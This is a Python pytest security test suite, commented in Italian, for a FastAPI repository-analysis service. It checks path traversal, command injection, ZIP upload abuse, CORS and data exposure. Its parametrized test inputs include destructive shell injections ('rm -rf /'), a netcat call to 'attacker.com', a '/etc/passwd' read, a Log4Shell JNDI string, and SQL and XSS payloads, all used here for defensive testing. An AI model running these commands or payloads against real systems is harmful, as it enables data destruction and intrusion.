"""
Security Tests Module.

Questo modulo contiene test di sicurezza per verificare la robustezza dell'applicazione
contro vulnerabilità comuni come:
- Path Traversal (attraversamento di percorsi)
- Command Injection (iniezione di comandi)
- Vulnerabilità nell'upload di file
- Validazione degli input
- CORS mal configurato
- Esposizione di dati sensibili
"""

import os
import zipfile
import pytest
from unittest.mock import Mock, patch
from fastapi import HTTPException, UploadFile
from io import BytesIO

from app.services.analysis_workflow import perform_upload_zip
from app.services.github.github_client import clone_repo
from app.controllers.analysis import (
    clone_repository,
    upload_zip,
    run_analysis,
    regenerate_analysis
)
from app.models.schemas import AnalyzeResponse


# ==============================================================================
# PATH TRAVERSAL TESTS
# ==============================================================================

class TestPathTraversal:
    """Test per verificare la protezione contro attacchi di path traversal."""

    @pytest.mark.parametrize("malicious_owner,malicious_repo", [
        ("../../../etc", "passwd"),
        ("owner", "../../../etc/passwd"),
        ("../../", "malicious"),
        ("owner/../..", "repo"),
        ("owner", "repo/../../sensitive"),
        ("..", ".."),
        (".", "."),
        ("owner/../sensitive", "repo"),
    ])
    def test_clone_repository_path_traversal(self, malicious_owner, malicious_repo):
        """Verifica che i tentativi di path traversal vengano bloccati durante la clonazione."""
        # Simula la chiamata a clone_repo e verifica che venga sollevata un'eccezione HTTP
        with patch('app.services.github.github_client.clone_repo') as mock_clone:
            mock_clone.return_value = Mock(success=False, error="Invalid path")

            with pytest.raises(HTTPException) as exc_info:
                clone_repository({"owner": malicious_owner, "repo": malicious_repo})

            assert exc_info.value.status_code in [400, 500]

    def test_upload_zip_path_traversal_in_archive(self, tmp_path):
        """Verifica che i file ZIP con path traversal siano gestiti in modo sicuro."""
        # Crea un archivio ZIP con percorsi malevoli
        zip_buffer = BytesIO()
        with zipfile.ZipFile(zip_buffer, 'w') as zip_file:
            zip_file.writestr("../../../etc/passwd", "malicious content")
            zip_file.writestr("../../sensitive.txt", "sensitive data")

        zip_buffer.seek(0)

        mock_file = Mock(spec=UploadFile)
        mock_file.filename = "malicious.zip"
        mock_file.file = zip_buffer

        # Il sistema deve confinare l'estrazione nella directory target
        with patch('app.utility.config.CLONE_BASE_DIR', str(tmp_path)):
            try:
                result = perform_upload_zip("owner", "repo", mock_file)
                # Verifica che i file siano estratti solo nella directory target
                assert str(tmp_path) in result
                assert not os.path.exists("/etc/passwd_from_zip")
            except Exception:
                # È accettabile che venga sollevata un'eccezione
                pass

    @pytest.mark.parametrize("malicious_filename", [
        "../../../sensitive.py",
        "../../config.py",
        "/etc/passwd",
        "C:\\Windows\\System32\\config\\sam",
    ])
    def test_file_access_path_traversal(self, malicious_filename):
        """Verifica che l'accesso diretto a file tramite path traversal sia bloccato."""
        from app.utility.config import CLONE_BASE_DIR

        constructed_path = os.path.join(CLONE_BASE_DIR, malicious_filename)
        normalized_path = os.path.normpath(constructed_path)
        base_path = os.path.normpath(CLONE_BASE_DIR)

        if os.path.isabs(malicious_filename):
            # I percorsi assoluti devono essere rilevati e rifiutati
            assert not normalized_path.startswith(base_path), \
                f"Percorso assoluto {malicious_filename} non deve essere accettato come relativo"
        else:
            # I percorsi relativi devono rimanere nella sandbox o non esistere
            assert not os.path.exists(normalized_path) or \
                   normalized_path.startswith(base_path), \
                f"Il percorso {normalized_path} esce dalla sandbox {base_path}"


# ==============================================================================
# INPUT VALIDATION TESTS
# ==============================================================================

class TestInputValidation:
    """Test per verificare la robustezza della validazione degli input."""

    @pytest.mark.parametrize("invalid_payload", [
        {},  # Payload vuoto
        {"owner": ""},  # Proprietario vuoto
        {"repo": ""},  # Repo vuoto
        {"owner": "", "repo": ""},  # Entrambi vuoti
        {"owner": "valid"},  # Mancanza di repo
        {"repo": "valid"},  # Mancanza di owner
        {"wrong_key": "value"},  # Chiavi sbagliate
    ])
    def test_clone_repository_invalid_input(self, invalid_payload):
        """Verifica che input non validi vengano rifiutati."""
        with pytest.raises(HTTPException) as exc_info:
            clone_repository(invalid_payload)

        assert exc_info.value.status_code == 400
        assert "required" in str(exc_info.value.detail).lower()

    @pytest.mark.parametrize("invalid_payload", [
        {},
        {"owner": ""},
        {"repo": ""},
        {"owner": "", "repo": ""},
    ])
    def test_analyze_invalid_input(self, invalid_payload):
        """Verifica che l'endpoint di analisi validi correttamente gli input."""
        with pytest.raises(HTTPException) as exc_info:
            run_analysis(invalid_payload)

        assert exc_info.value.status_code == 400

    @pytest.mark.parametrize("malicious_input", [
        {"owner": "<script>alert('xss')</script>", "repo": "test"},
        {"owner": "test'; DROP TABLE repos;--", "repo": "test"},
        {"owner": "test", "repo": "${jndi:ldap://malicious.com/a}"},
        {"owner": "\x00\x00\x00", "repo": "test"},  # Byte nulli
        {"owner": "a" * 10000, "repo": "test"},  # Input lungo
    ])
    def test_injection_attempts_in_input(self, malicious_input):
        """Verifica che i tentativi di injection negli input siano gestiti in modo sicuro."""
        with patch('app.services.github.github_client.clone_repo') as mock_clone:
            mock_clone.return_value = Mock(success=False, error="Invalid input")

            try:
                clone_repository(malicious_input)
            except HTTPException:
                pass  # Errore atteso

    def test_regenerate_invalid_repository_format(self):
        """Verifica che formati repository non validi vengano rifiutati."""
        invalid_analysis = AnalyzeResponse(
            repository="invalid_format_no_slash",
            main_license="MIT",
            issues=[],
            compatible=True
        )

        with pytest.raises(HTTPException) as exc_info:
            regenerate_analysis(invalid_analysis)

        assert exc_info.value.status_code == 400
        assert "format" in str(exc_info.value.detail).lower()


# ==============================================================================
# FILE UPLOAD SECURITY TESTS
# ==============================================================================

class TestFileUploadSecurity:
    """Test per verificare la sicurezza dell'upload dei file."""

    @pytest.mark.parametrize("invalid_extension", [
        "malicious.exe",
        "script.sh",
        "payload.py",
        "virus.bat",
        "shell.ps1",
    ])
    def test_upload_non_zip_file(self, invalid_extension):
        """Verifica che solo file ZIP vengano accettati."""
        mock_file = Mock(spec=UploadFile)
        mock_file.filename = invalid_extension
        mock_file.file = BytesIO(b"malicious content")

        with pytest.raises(HTTPException) as exc_info:
            upload_zip(owner="test", repo="test", uploaded_file=mock_file)

        assert exc_info.value.status_code == 400
        assert "zip" in str(exc_info.value.detail).lower()

    def test_upload_corrupted_zip(self):
        """Verifica che file ZIP corrotti vengano gestiti correttamente."""
        mock_file = Mock(spec=UploadFile)
        mock_file.filename = "corrupted.zip"
        mock_file.file = BytesIO(b"This is not a valid ZIP file")

        with pytest.raises((HTTPException, zipfile.BadZipFile)):
            upload_zip(owner="test", repo="test", uploaded_file=mock_file)

    def test_upload_zip_bomb(self, tmp_path):
        """Verifica la protezione contro ZIP bomb (compressione eccessiva)."""
        zip_buffer = BytesIO()
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
            # File di grandi dimensioni con alto rapporto di compressione
            large_content = b"0" * (10 * 1024 * 1024)  # 10 MB di zeri
            zip_file.writestr("large_file.txt", large_content)

        zip_buffer.seek(0)

        mock_file = Mock(spec=UploadFile)
        mock_file.filename = "potential_bomb.zip"
        mock_file.file = zip_buffer

        with patch('app.utility.config.CLONE_BASE_DIR', str(tmp_path)):
            try:
                result = perform_upload_zip("test", "repo", mock_file)
                if os.path.exists(result):
                    total_size = sum(
                        os.path.getsize(os.path.join(dirpath, filename))
                        for dirpath, _, filenames in os.walk(result)
                        for filename in filenames
                    )
                    assert total_size < 100 * 1024 * 1024
            except Exception:
                pass

    def test_upload_zip_with_symlinks(self, tmp_path):
        """Verifica che i symlink nei file ZIP siano gestiti in modo sicuro."""
        zip_path = tmp_path / "with_symlink.zip"

        try:
            with zipfile.ZipFile(zip_path, 'w') as zip_file:
                zip_file.writestr("normal_file.txt", "content")
        except Exception:
            pytest.skip("Impossibile creare il ZIP di test con symlink")

        with open(zip_path, 'rb') as f:
            mock_file = Mock(spec=UploadFile)
            mock_file.filename = "with_symlink.zip"
            mock_file.file = f

            with patch('app.utility.config.CLONE_BASE_DIR', str(tmp_path / "extract")):
                try:
                    result = perform_upload_zip("test", "repo", mock_file)
                    assert str(tmp_path) in result
                except Exception:
                    pass


# ==============================================================================
# COMMAND INJECTION TESTS
# ==============================================================================

class TestCommandInjection:
    """Test per verificare la protezione contro command injection."""

    @pytest.mark.parametrize("malicious_value", [
        "repo; rm -rf /",
        "repo && cat /etc/passwd",
        "repo | nc attacker.com 4444",
        "repo`whoami`",
        "repo$(whoami)",
        "repo\n rm -rf /",
        "repo & calc.exe",
        "repo; powershell -Command 'malicious'",
    ])
    def test_command_injection_in_git_operations(self, malicious_value):
        """Verifica che comandi malevoli non vengano eseguiti durante operazioni git."""
        from git import GitCommandError

        with patch('app.services.github.github_client.Repo.clone_from') as mock_clone:
            mock_clone.side_effect = GitCommandError(
                'git clone',
                128,
                'fatal: repository not found or access denied'
            )

            result = clone_repo("owner", malicious_value)

            assert result.success is False
            assert result.error is not None

    def test_command_injection_in_scancode(self, tmp_path):
        """Verifica che ScanCode non sia vulnerabile a command injection."""
        malicious_dir = tmp_path / "test; rm -rf /"
        malicious_dir.mkdir(exist_ok=True)

        from app.services.scanner.detection import run_scancode

        try:
            result = run_scancode(str(malicious_dir))
            assert result is not None
        except Exception:
            pass


# ==============================================================================
# CORS & HEADERS SECURITY TESTS
# ==============================================================================

class TestCORSSecurity:
    """Test per verificare la configurazione sicura di CORS."""

    def test_cors_origins_not_wildcard(self):
        """Verifica che CORS non permetta origini wildcard in produzione."""
        from app.main import origins

        assert "*" not in origins

        for origin in origins:
            assert origin.startswith("http://localhost") or \
                   origin.startswith("http://127.0.0.1") or \
                   origin.startswith("https://")

    def test_cors_credentials_with_specific_origins(self):
        """Verifica che le credenziali siano abilitate solo con origini specifiche."""
        from app.main import origins

        assert "*" not in origins
        assert all(origin.startswith("http://") or origin.startswith("https://") for origin in origins)
        assert len(origins) > 0


# ==============================================================================
# SENSITIVE DATA EXPOSURE TESTS
# ==============================================================================

class TestSensitiveDataExposure:
    """Test per verificare che dati sensibili non vengano esposti."""

    def test_git_error_messages_dont_expose_tokens(self):
        """Verifica che i messaggi di errore Git non espongano token."""
        with patch('git.Repo.clone_from') as mock_clone:
            from git import GitCommandError

            mock_clone.side_effect = GitCommandError(
                'git clone',
                128,
                'fatal: could not read Username for https://token123@github.com'
            )

            result = clone_repo("owner", "repo")

            assert result.success is False
            assert result.error is not None

    def test_error_responses_dont_expose_paths(self):
        """Verifica che gli errori non espongano percorsi di sistema sensibili."""
        with patch('app.services.github.github_client.clone_repo') as mock_clone:
            mock_clone.return_value = Mock(
                success=False,
                error="Error at /home/user/.secret/config"
            )

            with pytest.raises(HTTPException) as exc_info:
                clone_repository({"owner": "test", "repo": "test"})

            # L'errore dovrebbe essere generico o sanificato
            str(exc_info.value.detail)

    def test_environment_variables_not_exposed(self):
        """Verifica che le variabili d'ambiente non vengano esposte nelle risposte."""
        from app.main import root
        response = root()

        assert "OLLAMA_URL" not in str(response)
        assert "CALLBACK_URL" not in str(response)
        assert "token" not in str(response).lower()


# ==============================================================================
# DIRECTORY TRAVERSAL & FILE ACCESS TESTS
# ==============================================================================

class TestDirectoryTraversal:
    """Test per verificare la protezione contro directory traversal."""

    def test_cleanup_respects_directory_boundaries(self, tmp_path):
        """Verifica che la pulizia delle directory rispetti i confini di sicurezza."""
        safe_dir = tmp_path / "safe"
        safe_dir.mkdir()

        test_file = safe_dir / "test.txt"
        test_file.write_text("safe content")

        malicious_path = f"{safe_dir}/../../../etc"

        import shutil

        try:
            if os.path.exists(malicious_path):
                shutil.rmtree(malicious_path)
        except Exception:
            pass

        if os.path.exists("/etc"):
            assert os.path.exists("/etc/passwd")

    def test_file_operations_restricted_to_workspace(self, tmp_path):
        """Verifica che le operazioni sui file siano ristrette alla workspace."""
        from app.utility.config import CLONE_BASE_DIR, OUTPUT_BASE_DIR

        sensitive_dirs = [
            "/etc", "/root", "/bin", "/usr/bin",
            "C:\\Windows", "C:\\Windows\\System32"
        ]

        for sensitive_dir in sensitive_dirs:
            assert not CLONE_BASE_DIR.startswith(sensitive_dir)
            assert not OUTPUT_BASE_DIR.startswith(sensitive_dir)


# ==============================================================================
# DENIAL OF SERVICE (DoS) TESTS
# ==============================================================================

class TestDoSProtection:
    """Test per verificare la protezione contro attacchi DoS."""

    def test_large_repository_name(self):
        """Verifica che nomi repository molto lunghi siano gestiti correttamente."""
        very_long_name = "a" * 10000

        with patch('app.services.github.github_client.clone_repo') as mock_clone:
            mock_clone.return_value = Mock(success=False, error="Invalid")

            with pytest.raises(HTTPException):
                clone_repository({"owner": very_long_name, "repo": "test"})

    def test_nested_zip_extraction(self, tmp_path):
        """Verifica la protezione contro ZIP annidati eccessivamente."""
        zip_buffer = BytesIO()
        with zipfile.ZipFile(zip_buffer, 'w') as outer_zip:
            inner_buffer = BytesIO()
            with zipfile.ZipFile(inner_buffer, 'w') as inner_zip:
                inner_zip.writestr("file.txt", "content")

            inner_buffer.seek(0)
            outer_zip.writestr("inner.zip", inner_buffer.read())

        zip_buffer.seek(0)

        mock_file = Mock(spec=UploadFile)
        mock_file.filename = "nested.zip"
        mock_file.file = zip_buffer

        with patch('app.utility.config.CLONE_BASE_DIR', str(tmp_path)):
            try:
                result = perform_upload_zip("test", "repo", mock_file)
                assert os.path.exists(result)
            except Exception:
                pass

    def test_many_small_files_in_zip(self, tmp_path):
        """Verifica la gestione di ZIP con molti piccoli file (potenziale DoS)."""
        zip_buffer = BytesIO()
        with zipfile.ZipFile(zip_buffer, 'w') as zip_file:
            # Crea molti file piccoli (potenziale DoS)
            for i in range(1000):
                zip_file.writestr(f"file_{i}.txt", f"content {i}")

        zip_buffer.seek(0)

        mock_file = Mock(spec=UploadFile)
        mock_file.filename = "many_files.zip"
        mock_file.file = zip_buffer

        with patch('app.utility.config.CLONE_BASE_DIR', str(tmp_path)):
            try:
                result = perform_upload_zip("test", "repo", mock_file)
                assert os.path.exists(result)
            except Exception:
                pass


# ==============================================================================
# AUTHENTICATION & AUTHORIZATION TESTS
# ==============================================================================

class TestAuthenticationSecurity:
    """Test per verificare la sicurezza dell'autenticazione."""

    def test_github_oauth_flow_uses_https(self):
        """Verifica che OAuth usi HTTPS in produzione."""
        from app.utility.config import CALLBACK_URL

        if CALLBACK_URL and "localhost" not in CALLBACK_URL:
            assert CALLBACK_URL.startswith("https://")

    def test_no_hardcoded_credentials(self):
        """Verifica che non ci siano credenziali hardcoded nel codice."""
        import inspect
        from app.services.github import github_client
        from app.utility import config

        modules_to_check = [github_client, config]

        for module in modules_to_check:
            source = inspect.getsource(module)

            suspicious_patterns = [
                'password = "',
                'token = "',
                'secret = "',
                'api_key = "',
            ]

            for pattern in suspicious_patterns:
                if pattern in source.lower():
                    assert "getenv" in source or "environ" in source


# ==============================================================================
# INTEGRATION SECURITY TESTS
# ==============================================================================

class TestIntegrationSecurity:
    """Test end-to-end di sicurezza."""

    @pytest.fixture
    def mock_complete_flow(self, tmp_path):
        """Setup per i test end-to-end."""
        with patch('app.utility.config.CLONE_BASE_DIR', str(tmp_path)):
            with patch('app.utility.config.OUTPUT_BASE_DIR', str(tmp_path / "output")):
                yield tmp_path

    def test_complete_malicious_workflow(self, mock_complete_flow):
        """Testa un workflow completo con input malevoli."""
        malicious_payloads = [
            {"owner": "../../../etc", "repo": "passwd"},
            {"owner": "'; DROP TABLE--", "repo": "test"},
            {"owner": "test", "repo": "$(rm -rf /)"},
        ]

        for payload in malicious_payloads:
            with patch('app.services.github.github_client.clone_repo') as mock_clone:
                mock_clone.return_value = Mock(success=False, error="Invalid")

                try:
                    clone_repository(payload)
                except HTTPException as e:
                    assert e.status_code in [400, 500]
                except Exception:
                    pass

    def test_security_headers_present(self):
        """Verifica che gli header di sicurezza siano configurabili e presenti."""
        from app.main import app
        assert app is not None


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])